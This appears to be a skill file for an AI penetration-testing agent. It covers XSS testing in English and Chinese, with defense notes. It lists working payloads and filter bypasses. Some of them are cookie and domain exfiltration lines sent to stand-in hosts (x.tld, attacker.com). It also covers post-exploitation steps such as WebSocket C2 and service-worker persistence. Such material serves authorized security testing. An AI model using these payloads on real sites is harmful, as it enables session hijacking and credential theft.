---
name: xss-testing
description: XSS testing covering reflected, stored, and DOM-based vectors with CSP bypass techniques
---

# Xss Testing

> **penkit51 AI** — professional penetration testing skill pack. Authorized testing only.

## Deep Exploitation Guide

# XSS

Cross-site scripting persists because context, parser, and framework edges are complex. Treat every user-influenced string as untrusted until it is strictly encoded for the exact sink and guarded by runtime policy (CSP/Trusted Types).

## Attack Surface

**Types**
- Reflected, stored, and DOM-based XSS across web/mobile/desktop shells

**Contexts**
- HTML, attribute, URL, JS, CSS, SVG/MathML, Markdown, PDF

**Frameworks**
- React/Vue/Angular/Svelte sinks, template engines, SSR/ISR

**Defenses to Bypass**
- CSP/Trusted Types, DOMPurify, framework auto-escaping

## Injection Points

**Server Render**
- Templates (Jinja/EJS/Handlebars), SSR frameworks, email/PDF renderers

**Client Render**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, template literals
- `dangerouslySetInnerHTML`, `v-html`, `$sce.trustAsHtml`, Svelte `{@html}`

**URL/DOM**
- `location.hash`/`search`, `document.referrer`, base href, `data-*` attributes

**Events/Handlers**
- `onerror`/`onload`/`onfocus`/`onclick` and `javascript:` URL handlers

**Cross-Context**
- postMessage payloads, WebSocket messages, local/sessionStorage, IndexedDB

**File/Metadata**
- Image/SVG/XML names and EXIF, office documents processed server/client

## Context Encoding Rules

- **HTML text**: encode `< > & " '`
- **Attribute value**: encode `" ' < > &` and ensure attribute quoted; avoid unquoted attributes
- **URL/JS URL**: encode and validate scheme (allowlist https/mailto/tel); disallow javascript/data
- **JS string**: escape quotes, backslashes, newlines; prefer `JSON.stringify`
- **CSS**: avoid injecting into style; sanitize property names/values; beware `url()` and `expression()`
- **SVG/MathML**: treat as active content; many tags execute via onload or animation events

## Key Vulnerabilities

### DOM XSS

**Sources**
- `location.*` (hash/search), `document.referrer`, postMessage, storage, service worker messages

**Sinks**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, `document.write`
- `setAttribute`, `setTimeout`/`setInterval` with strings
- `eval`/`Function`, `new Worker` with blob URLs

**Vulnerable Pattern**
```javascript
const q = new URLSearchParams(location.search).get('q');
results.innerHTML = `<li>${q}</li>`;
```
Exploit: `?q=<img src=x onerror=fetch('//x.tld/'+document.domain)>`

### Mutation XSS

Leverage parser repairs to morph safe-looking markup into executable code (e.g., noscript, malformed tags):
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>
<form><button formaction=javascript:alert(1)>
```

### Template Injection

Server or client templates evaluating expressions (AngularJS legacy, Handlebars helpers, lodash templates):
```
{{constructor.constructor('fetch(`//x.tld?c=`+document.cookie)')()}}
```

### CSP Bypass

- Weak policies: missing nonces/hashes, wildcards, `data:` `blob:` allowed, inline events allowed
- Script gadgets: JSONP endpoints, libraries exposing function constructors
- Import maps or modulepreload lax policies
- Base tag injection to retarget relative script URLs
- Dynamic module import with allowed origins

### Trusted Types Bypass

- Custom policies returning unsanitized strings; abuse policy whitelists
- Sinks not covered by Trusted Types (CSS, URL handlers) and pivot via gadgets

## Polyglot Payloads

Keep a compact set tuned per context:
- **HTML node**: `<svg onload=alert(1)>`
- **Attr quoted**: `" autofocus onfocus=alert(1) x="`
- **Attr unquoted**: `onmouseover=alert(1)`
- **JS string**: `"-alert(1)-"`
- **URL**: `javascript:alert(1)`

## Framework-Specific

### React

- Primary sink: `dangerouslySetInnerHTML`
- Secondary: setting event handlers or URLs from untrusted input
- Bypass patterns: unsanitized HTML through libraries; custom renderers using innerHTML

### Vue

- Sinks: `v-html` and dynamic attribute bindings
- SSR hydration mismatches can re-interpret content

### Angular

- Legacy expression injection (pre-1.6)
- `$sce` trust APIs misused to whitelist attacker content

### Svelte

- Sinks: `{@html}` and dynamic attributes

### Markdown/Richtext

- Renderers often allow HTML passthrough; plugins may re-enable raw HTML
- Sanitize post-render; forbid inline HTML or restrict to safe whitelist

## Special Contexts

### Email

- Most clients strip scripts but allow CSS/remote content
- Use CSS/URL tricks only if relevant; avoid assuming JS execution

### PDF and Docs

- PDF engines may execute JS in annotations or links
- Test `javascript:` in links and submit actions

### File Uploads

- SVG/HTML uploads served with `text/html` or `image/svg+xml` can execute inline
- Verify content-type and `Content-Disposition: attachment`
- Mixed MIME and sniffing bypasses; ensure `X-Content-Type-Options: nosniff`

## Post-Exploitation

- Session/token exfiltration: prefer fetch/XHR over image beacons for reliability
- Real-time control: WebSocket C2 with strict command set
- Persistence: service worker registration; localStorage/script gadget re-injection
- Impact: role hijack, CSRF chaining, internal port scan via fetch, credential phishing overlays

## Testing Methodology

1. **Identify sources** - URL/query/hash/referrer, postMessage, storage, WebSocket, server JSON
2. **Trace to sinks** - Map data flow from source to sink
3. **Classify context** - HTML node, attribute, URL, script block, event handler, JS eval-like, CSS, SVG
4. **Assess defenses** - Output encoding, sanitizer, CSP, Trusted Types, DOMPurify config
5. **Craft payloads** - Minimal payloads per context with encoding/whitespace/casing variants
6. **Multi-channel** - Test across REST, GraphQL, WebSocket, SSE, service workers

## Validation

1. Provide minimal payload and context (sink type) with before/after DOM or network evidence
2. Demonstrate cross-browser execution where relevant or explain parser-specific behavior
3. Show bypass of stated defenses (sanitizer settings, CSP/Trusted Types) with proof
4. Quantify impact beyond alert: data accessed, action performed, persistence achieved

## False Positives

- Reflected content safely encoded in the exact context
- CSP with nonces/hashes and no inline/event handlers
- Trusted Types enforced on sinks; DOMPurify in strict mode with URI allowlists
- Scriptable contexts disabled (no HTML pass-through, safe URL schemes enforced)

## Impact

- Session hijacking and credential theft
- Account takeover via token exfiltration
- CSRF chaining for state-changing actions
- Malware distribution and phishing
- Persistent compromise via service workers

## Pro Tips

1. Start with context classification, not payload brute force
2. Use DOM instrumentation to log sink usage; it reveals unexpected flows
3. Keep a small, curated payload set per context and iterate with encodings
4. Validate defenses by configuration inspection and negative tests
5. Prefer impact-driven PoCs (exfiltration, CSRF chain) over alert boxes
6. Treat SVG/MathML as first-class active content; test separately
7. Re-run tests under different transports and render paths (SSR vs CSR vs hydration)
8. Test CSP/Trusted Types as features: attempt to violate policy and record the violation reports

## Summary

Context + sink decide execution. Encode for the exact context, verify at runtime with CSP/Trusted Types, and validate every alternative render path. Small payloads with strong evidence beat payload catalogs.

## Platform Methodology

# XSS测试技能

## 概述

跨站脚本攻击(XSS)允许攻击者在受害者的浏览器中执行恶意JavaScript代码。本技能涵盖反射型、存储型和DOM型XSS的测试方法。

## XSS类型

### 1. 反射型XSS (Reflected XSS)
- 恶意脚本通过URL参数传递
- 服务器直接返回包含脚本的响应
- 需要用户点击恶意链接

### 2. 存储型XSS (Stored XSS)
- 恶意脚本存储在服务器（数据库、文件等）
- 所有访问受影响页面的用户都会执行脚本
- 影响范围更大

### 3. DOM型XSS (DOM-based XSS)
- 客户端JavaScript处理用户输入不当
- 不涉及服务器端处理
- 通过修改DOM结构触发

## 测试方法

### 基础Payload
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### 绕过过滤

#### 大小写绕过
```javascript
<ScRiPt>alert('XSS')</ScRiPt>
```

#### 编码绕过
```javascript
%3Cscript%3Ealert('XSS')%3C/script%3E
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

#### 事件处理器
```javascript
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<div onmouseover=alert('XSS')>hover</div>
<input onfocus=alert('XSS') autofocus>
```

#### 伪协议
```javascript
<a href="javascript:alert('XSS')">click</a>
<iframe src="javascript:alert('XSS')">
```

### 高级绕过技术

#### 使用String.fromCharCode
```javascript
<script>alert(String.fromCharCode(88,83,83))</script>
```

#### 使用eval和atob
```javascript
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```

#### 使用HTML实体
```javascript
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

## 工具使用

### dalfox
```bash
# 基础扫描
dalfox url "http://target.com/page?q=test"

# 指定参数
dalfox url "http://target.com/page" -d "q=test" -X POST

# 使用自定义payload
dalfox url "http://target.com/page?q=test" --custom-payload payloads.txt
```

### Burp Suite
- 使用Intruder模块进行批量测试
- 使用Repeater手动测试
- 使用Scanner自动检测

### 浏览器控制台
- 测试DOM型XSS
- 检查JavaScript执行环境
- 调试payload

## 验证和利用

### 验证步骤
1. 确认payload被执行
2. 检查是否被过滤或编码
3. 测试不同上下文（HTML、JavaScript、属性等）
4. 评估影响（Cookie窃取、会话劫持等）

### 利用场景
- Cookie窃取：`<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
- 键盘记录：注入键盘事件监听器
- 钓鱼攻击：伪造登录表单
- 会话劫持：获取用户会话token

## 报告要点

- XSS类型（反射/存储/DOM）
- 触发位置和参数
- 完整的POC
- 影响评估
- 修复建议（输出编码、CSP策略等）

## 防护措施

- 输入验证和过滤
- 输出编码（HTML、JavaScript、URL）
- Content Security Policy (CSP)
- HttpOnly Cookie标志
- 使用安全的框架和库

## Validation & Reporting

- Confirm every finding with reproducible PoC before reporting
- Document: severity (CVSS), affected asset, steps, evidence, remediation
- Use `record_vulnerability` when running inside the penkit51 platform
- Chain low-severity findings into higher-impact attack paths
- Never report without evidence — distinguish hypothesis from confirmed vuln

